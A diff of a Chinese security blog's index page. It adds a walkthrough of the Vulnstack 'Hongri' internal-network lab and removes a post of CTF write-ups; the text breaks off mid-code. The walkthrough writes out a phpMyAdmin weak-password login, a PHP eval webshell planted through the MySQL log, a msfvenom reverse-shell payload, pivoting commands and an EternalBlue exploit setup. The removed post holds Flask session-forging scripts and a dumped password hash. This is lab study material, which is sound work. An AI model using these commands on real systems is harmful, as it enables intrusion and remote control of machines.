@@ -188,6 +188,163 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/09/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
+      <meta itemprop="name" content="小zhou">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/07/09/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/" class="post-title-link" itemprop="url">红日靶场1</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-07-09 21:02:52" itemprop="dateCreated datePublished" datetime="2023-07-09T21:02:52+08:00">2023-07-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-07-13 14:34:46" itemprop="dateModified" datetime="2023-07-13T14:34:46+08:00">2023-07-13</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>424</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p> 打一下内网渗透</p>
+<p><img src="/2023/07/09/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/1605154-20200928100252971-711962221.png"></p>
+<!--mroe-->
+
+<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>靶场下载地址</p>
+<p><a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">漏洞详情 (qiyuanxuetang.net)</a></p>
+<p>vm网卡设置,win7,两个网络适配器</p>
+<p><img src="/2023/07/09/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/QQ%E6%88%AA%E5%9B%BE20230709213618.png"></p>
+<p>剩下两个</p>
+<p><img src="/2023/07/09/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/QQ%E6%88%AA%E5%9B%BE20230709213740.png"></p>
+<p>默认登录密码： hongrisec@2019</p>
+<p>打开之后发现啥也扫描不到，之后登录进去，关闭防火墙，启动phpstudy</p>
+<p>后才能扫描到，</p>
+<p>win7 外网ip:192.168.158.170</p>
+<p> 内网ip: 192.158.52.143</p>
+<p>windos2018 Ip 192.168.52.138</p>
+<p>win2k3 ip 192.168.52.141,</p>
+<p>经侧式后发现能够ping的通，应该就搭建好了吧。</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.158.0/24 -sn</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.158.167 -Pn //开放端口</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.158.167</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞一：</p>
+<p>phpmyadmin弱口令登录root root</p>
+<p>查看能否写入文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &quot;secure%&quot;;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>secure_file_priv</th>
+<th>NULL</th>
+</tr>
+</thead>
+</table>
+<p>写不进去，所以查看日志</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW GLOBAL VARIABLES LIKE &#x27;%general%&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/09/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/QQ%E6%88%AA%E5%9B%BE20230709222532.png"></p>
+<p>日志为关闭</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL general_log = ON;# 开启日志</span><br><span class="line">SET GLOBAL general_log_file = &#x27;C:/WWW/test.php&#x27;;# 设置日志位置为网站目录</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/09/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/QQ%E6%88%AA%E5%9B%BE20230709225410.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php eval ($_POST[1]);?&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连接</p>
+<p>漏洞2 经典永恒之蓝，看kali工具那一篇。</p>
+<p>漏洞3 yxcms 框架漏洞，但靶机phpstudy 好像有问题，发现phpsudy 好像目录不对，也调不动，算了，无所谓了，简单的xss。</p>
+<p>上传</p>
+<p>msfmenue木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.158.129 lport=4444 -f exe &gt;shell.exe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001  #切换编码</span><br></pre></td></tr></table></figure>
+
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>查看ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.52.143</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#查看路由信息</span><br><span class="line">run get_local_subnets</span><br><span class="line">#添加一条路由</span><br><span class="line">run autoroute -s 192.168.52.0/24</span><br><span class="line">run autoroute -p 查看配置信息</span><br></pre></td></tr></table></figure>
+
+<p>使用msf的socks代理模块，</p>
+<h3 id="proxychains4-msf"><a href="#proxychains4-msf" class="headerlink" title="proxychains4+msf"></a>proxychains4+msf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">jobs //查看工作状态</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/proxychains4.conf  </span><br></pre></td></tr></table></figure>
+
+<p>内网信息收集</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 192.168.52.141 -p22,445,443,135 </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/09/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/QQ%E6%88%AA%E5%9B%BE20230713133324.png"></p>
+<p>发现445端口开放尝试，ms17-010没效果</p>
+<p>打windows 2008</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lport 5555</span><br><span class="line">set lhost 192.168.52.143</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/adsry/p/15039414.html">https://www.cnblogs.com/adsry/p/15039414.html</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/08/linux%E5%B7%A5%E5%85%B7/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1355,149 +1512,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/23/nss2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
-      <meta itemprop="name" content="小zhou">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/05/23/nss2/" class="post-title-link" itemprop="url">nss2</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-05-23 13:41:30" itemprop="dateCreated datePublished" datetime="2023-05-23T13:41:30+08:00">2023-05-23</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-10-25 21:04:17" itemprop="dateModified" datetime="2023-10-25T21:04:17+08:00">2023-10-25</time>
-              </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.4k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>5 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="LitCTF-2023-Flag点击就送！"><a href="#LitCTF-2023-Flag点击就送！" class="headerlink" title="[LitCTF 2023]Flag点击就送！"></a>[LitCTF 2023]Flag点击就送！</h2><p><strong>flask session 伪造</strong></p>
-<p>decode.py</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">!/usr/bin/env python3</span><br><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from flask.sessions import session_json_serializer</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line"> </span><br><span class="line">def decryption(payload):</span><br><span class="line">    payload, sig = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line">    payload, timestamp = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line"> </span><br><span class="line">    decompress = False</span><br><span class="line">    if payload.startswith(b&#x27;.&#x27;):</span><br><span class="line">        payload = payload[1:]</span><br><span class="line">        decompress = True</span><br><span class="line"> </span><br><span class="line">    try:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise Exception(&#x27;Could not base64 decode the payload because of &#x27;</span><br><span class="line">                         &#x27;an exception&#x27;)</span><br><span class="line"> </span><br><span class="line">    if decompress:</span><br><span class="line">        try:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            raise Exception(&#x27;Could not zlib decompress the payload before &#x27;</span><br><span class="line">                             &#x27;decoding the payload&#x27;)</span><br><span class="line"> </span><br><span class="line">    return session_json_serializer.loads(payload)</span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(decryption(sys.argv[1].encode()))</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python decode.py 密文</span><br></pre></td></tr></table></figure>
-
-<p>encode.py</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">!/usr/bin/env python3</span><br><span class="line">&quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;</span><br><span class="line">__author__ = &#x27;Wilson Sumanang, Alexandre ZANNI&#x27;</span><br><span class="line"> </span><br><span class="line"># standard imports</span><br><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line">import ast</span><br><span class="line"> </span><br><span class="line"># Abstract Base Classes (PEP 3119)</span><br><span class="line">if sys.version_info[0] &lt; 3: # &lt; 3.0</span><br><span class="line">    raise Exception(&#x27;Must be using at least Python 3&#x27;)</span><br><span class="line">elif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4</span><br><span class="line">    from abc import ABCMeta, abstractmethod</span><br><span class="line">else: # &gt; 3.4</span><br><span class="line">    from abc import ABC, abstractmethod</span><br><span class="line"> </span><br><span class="line"># Lib for argument parsing</span><br><span class="line">import argparse</span><br><span class="line"> </span><br><span class="line"># external Imports</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line"> </span><br><span class="line">class MockApp(object):</span><br><span class="line"> </span><br><span class="line">    def __init__(self, secret_key):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"> </span><br><span class="line">if sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4</span><br><span class="line">    class FSCM(metaclass=ABCMeta):</span><br><span class="line">        def encode(secret_key, session_cookie_structure):</span><br><span class="line">            &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br><span class="line">            try:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"> </span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"> </span><br><span class="line">                return s.dumps(session_cookie_structure)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Encoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line"> </span><br><span class="line">        def decode(session_cookie_value, secret_key=None):</span><br><span class="line">            &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span><br><span class="line">            try:</span><br><span class="line">                if(secret_key==None):</span><br><span class="line">                    compressed = False</span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"> </span><br><span class="line">                    if payload.startswith(&#x27;.&#x27;):</span><br><span class="line">                        compressed = True</span><br><span class="line">                        payload = payload[1:]</span><br><span class="line"> </span><br><span class="line">                    data = payload.split(&quot;.&quot;)[0]</span><br><span class="line"> </span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    if compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"> </span><br><span class="line">                    return data</span><br><span class="line">                else:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"> </span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"> </span><br><span class="line">                    return s.loads(session_cookie_value)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Decoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line">else: # &gt; 3.4</span><br><span class="line">    class FSCM(ABC):</span><br><span class="line">        def encode(secret_key, session_cookie_structure):</span><br><span class="line">            &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br><span class="line">            try:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"> </span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"> </span><br><span class="line">                return s.dumps(session_cookie_structure)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Encoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line"> </span><br><span class="line">        def decode(session_cookie_value, secret_key=None):</span><br><span class="line">            &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span><br><span class="line">            try:</span><br><span class="line">                if(secret_key==None):</span><br><span class="line">                    compressed = False</span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"> </span><br><span class="line">                    if payload.startswith(&#x27;.&#x27;):</span><br><span class="line">                        compressed = True</span><br><span class="line">                        payload = payload[1:]</span><br><span class="line"> </span><br><span class="line">                    data = payload.split(&quot;.&quot;)[0]</span><br><span class="line"> </span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    if compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"> </span><br><span class="line">                    return data</span><br><span class="line">                else:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"> </span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"> </span><br><span class="line">                    return s.loads(session_cookie_value)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Decoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line"> </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # Args are only relevant for __main__ usage</span><br><span class="line">    </span><br><span class="line">    ## Description for help</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">                description=&#x27;Flask Session Cookie Decoder/Encoder&#x27;,</span><br><span class="line">                epilog=&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;)</span><br><span class="line"> </span><br><span class="line">    ## prepare sub commands</span><br><span class="line">    subparsers = parser.add_subparsers(help=&#x27;sub-command help&#x27;, dest=&#x27;subcommand&#x27;)</span><br><span class="line"> </span><br><span class="line">    ## create the parser for the encode command</span><br><span class="line">    parser_encode = subparsers.add_parser(&#x27;encode&#x27;, help=&#x27;encode&#x27;)</span><br><span class="line">    parser_encode.add_argument(&#x27;-s&#x27;, &#x27;--secret-key&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                                help=&#x27;Secret key&#x27;, required=True)</span><br><span class="line">    parser_encode.add_argument(&#x27;-t&#x27;, &#x27;--cookie-structure&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                                help=&#x27;Session cookie structure&#x27;, required=True)</span><br><span class="line"> </span><br><span class="line">    ## create the parser for the decode command</span><br><span class="line">    parser_decode = subparsers.add_parser(&#x27;decode&#x27;, help=&#x27;decode&#x27;)</span><br><span class="line">    parser_decode.add_argument(&#x27;-s&#x27;, &#x27;--secret-key&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                                help=&#x27;Secret key&#x27;, required=False)</span><br><span class="line">    parser_decode.add_argument(&#x27;-c&#x27;, &#x27;--cookie-value&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                                help=&#x27;Session cookie value&#x27;, required=True)</span><br><span class="line"> </span><br><span class="line">    ## get args</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"> </span><br><span class="line">    ## find the option chosen</span><br><span class="line">    if(args.subcommand == &#x27;encode&#x27;):</span><br><span class="line">        if(args.secret_key is not None and args.cookie_structure is not None):</span><br><span class="line">            print(FSCM.encode(args.secret_key, args.cookie_structure))</span><br><span class="line">    elif(args.subcommand == &#x27;decode&#x27;):</span><br><span class="line">        if(args.secret_key is not None and args.cookie_value is not None):</span><br><span class="line">            print(FSCM.decode(args.cookie_value,args.secret_key))</span><br><span class="line">        elif(args.cookie_value is not None):</span><br><span class="line">            print(FSCM.decode(args.cookie_value))</span><br></pre></td></tr></table></figure>
-
-<p>密码是猜出的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python encode.py encode -s &#x27;LitCTF&#x27; -t &#x27;&#123; &quot;name&quot;: &quot;admin&quot; &#125;&#x27;</span><br></pre></td></tr></table></figure>
-
-<h2 id="蓝帽杯-2022-初赛-计算机取证-1"><a href="#蓝帽杯-2022-初赛-计算机取证-1" class="headerlink" title="[蓝帽杯 2022 初赛]计算机取证_1"></a>[蓝帽杯 2022 初赛]计算机取证_1</h2><p>下载安装，看kali工具</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f  /home/zhou/桌面/1.dmp windows.hashdump</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/05/23/nss2/QQ%E6%88%AA%E5%9B%BE20230702134524.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7f21caca5685f10d9e849cc84c340528</span><br></pre></td></tr></table></figure>
-
-<p>然后解密，咋解，还没想好</p>
-<p>现对一个windows计算机进行取证，请您对以下问题进行分析解答。<br>制作该内存镜像的进程Pid号是多少</p>
-<p>python vol.py -f  &#x2F;home&#x2F;zhou&#x2F;桌面&#x2F;2.dmp windows.pslist</p>
-<p><img src="/2023/05/23/nss2/QQ%E6%88%AA%E5%9B%BE20230702140146.png"></p>
-<h2 id="UUCTF-2022-新生赛-ezrce"><a href="#UUCTF-2022-新生赛-ezrce" class="headerlink" title="[UUCTF 2022 新生赛]ezrce"></a>[UUCTF 2022 新生赛]ezrce</h2><h2 id="SWPUCTF-2022-新生赛-numgame"><a href="#SWPUCTF-2022-新生赛-numgame" class="headerlink" title="[SWPUCTF 2022 新生赛]numgame"></a>[SWPUCTF 2022 新生赛]numgame</h2><p>打开查看源码可以看到</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:28528/NsScTf.php</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//hint: 与get相似的另一种请求协议是什么呢</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nss</span></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">ctf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;./hint2.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/n|c/m&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>], <span class="variable">$matches</span>))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ 